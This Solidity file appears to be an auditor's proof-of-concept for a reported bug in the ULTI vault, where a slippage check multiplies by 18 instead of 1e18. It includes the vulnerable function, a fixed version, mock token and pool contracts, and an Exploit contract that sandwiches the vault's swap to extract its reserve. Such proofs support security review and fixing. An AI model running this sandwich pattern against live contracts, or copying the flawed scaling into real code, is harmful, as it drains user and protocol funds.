// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  ULTI — C-01 (Pashov, November review)
    _swapInputTokenForUlti multiplies by 18 instead of 1e18. The internal
    minimum collapses to 1782 wei, so a sandwiched swap of the protocol's
    100 input-token reserve goes through for 0.001 ULTI. The attacker
    back-runs and keeps almost all 100 tokens. MAX_SWAP_SLIPPAGE_BPS is
    3 * ULTI_NUMBER (33) = 99, the 0.99% cap from the review. */

contract Token {
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory s) {
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Pool {
    Token public token0;
    Token public token1;
    uint256 public reserve0;
    uint256 public reserve1;

    constructor(Token a, Token b, uint256 r0, uint256 r1) {
        token0 = a;
        token1 = b;
        reserve0 = r0;
        reserve1 = r1;
    }

    function swapExactInput(address tokenIn, uint256 amountIn, address to) external returns (uint256 out) {
        require(Token(tokenIn).transferFrom(msg.sender, address(this), amountIn), "pull");
        if (tokenIn == address(token0)) {
            out = reserve1 * amountIn / (reserve0 + amountIn); // [S3]
            reserve0 += amountIn;
            reserve1 -= out;
            require(token1.transfer(to, out), "out");
        } else {
            out = reserve0 * amountIn / (reserve1 + amountIn);
            reserve1 += amountIn;
            reserve0 -= out;
            require(token0.transfer(to, out), "out");
        }
    }
}

contract UltiVault {
    uint256 public constant ULTI_NUMBER = 33;
    uint256 public constant MAX_SWAP_SLIPPAGE_BPS = 3 * ULTI_NUMBER;
    Token public inputToken;
    Token public ulti;
    Pool public pool;
    uint256 public lastMin;
    uint256 public lastOut;

    constructor(Token _in, Token _ulti, Pool _pool) {
        inputToken = _in;
        ulti = _ulti;
        pool = _pool;
    }

    function _pull(uint256 inputAmountToSwap, uint256 effectiveMinUltiAmount) internal returns (uint256 ultiAmount) {
        inputToken.approve(address(pool), inputAmountToSwap);
        ultiAmount = pool.swapExactInput(address(inputToken), inputAmountToSwap, msg.sender);
        require(ultiAmount >= effectiveMinUltiAmount, "slippage");
        lastOut = ultiAmount;
    }

    function swapInputForUlti(uint256 inputAmountToSwap, uint256 minUltiAmount, uint256 twap, uint256 deadline)
        external
        returns (uint256)
    {
        if (inputAmountToSwap == 0) revert("input");
        if (minUltiAmount == 0) revert("min");
        require(block.timestamp <= deadline, "deadline");
        uint256 expectedUltiAmountWithoutSlippage = inputAmountToSwap * 18 / twap; // @> VULN: [S2] 18 instead of 1e18. 100e18 * 18 / 1e18 = 1800 wei.
        // FIX: uint256 expectedUltiAmountWithoutSlippage = inputAmountToSwap * 1e18 / twap;
        uint256 minUltiAmountInternal = (expectedUltiAmountWithoutSlippage * (10000 - MAX_SWAP_SLIPPAGE_BPS)) / 10000;
        uint256 effectiveMinUltiAmount = minUltiAmount > minUltiAmountInternal ? minUltiAmount : minUltiAmountInternal;
        lastMin = effectiveMinUltiAmount;
        return _pull(inputAmountToSwap, effectiveMinUltiAmount);
    }

    function swapFixed(uint256 inputAmountToSwap, uint256 minUltiAmount, uint256 twap, uint256 deadline)
        external
        returns (uint256)
    {
        if (inputAmountToSwap == 0) revert("input");
        if (minUltiAmount == 0) revert("min");
        require(block.timestamp <= deadline, "deadline");
        uint256 expectedUltiAmountWithoutSlippage = inputAmountToSwap * 1e18 / twap;
        uint256 minUltiAmountInternal = (expectedUltiAmountWithoutSlippage * (10000 - MAX_SWAP_SLIPPAGE_BPS)) / 10000;
        uint256 effectiveMinUltiAmount = minUltiAmount > minUltiAmountInternal ? minUltiAmount : minUltiAmountInternal;
        lastMin = effectiveMinUltiAmount;
        return _pull(inputAmountToSwap, effectiveMinUltiAmount);
    }
}

contract Exploit {
    Token public inputToken; // nonce 1
    Token public ulti; // nonce 2
    Pool public pool; // nonce 3
    UltiVault public vault; // nonce 4
    uint256 public extracted;
    uint256 public constant ATTACK_IN = 3152227660563662458372340;
    uint256 public constant RESERVE_IN = 100 ether;

    constructor() {
        inputToken = new Token("IN");
        ulti = new Token("ULTI");
        inputToken.mint(address(this), ATTACK_IN);
        inputToken.mint(address(this), RESERVE_IN);
        ulti.mint(address(this), 0);
        pool = new Pool(inputToken, ulti, 10_000 ether, 10_000 ether);
        // Pool constructor does not pull tokens. Seed balances to match reserves.
        inputToken.mint(address(pool), 10_000 ether);
        ulti.mint(address(pool), 10_000 ether);
        vault = new UltiVault(inputToken, ulti, pool);
        inputToken.transfer(address(vault), RESERVE_IN);
    }

    function frontRun() external {
        inputToken.approve(address(pool), ATTACK_IN);
        pool.swapExactInput(address(inputToken), ATTACK_IN, address(this));
    }

    function run() external {
        uint256 beforeBal = inputToken.balanceOf(address(this)); // [S1]
        inputToken.approve(address(pool), ATTACK_IN);
        pool.swapExactInput(address(inputToken), ATTACK_IN, address(this));
        vault.swapInputForUlti(RESERVE_IN, 1, 1 ether, block.timestamp); // [S4]
        uint256 held = ulti.balanceOf(address(this));
        ulti.approve(address(pool), held);
        pool.swapExactInput(address(ulti), held, address(this)); // [S5]
        extracted = inputToken.balanceOf(address(this)) - beforeBal; // [S6]
        require(vault.lastMin() == 1782, "internal min collapsed");
        require(vault.lastOut() < 0.01 ether, "slippage was not extreme");
        require(extracted > 99 ether, "protocol reserve not extracted");
    }
}
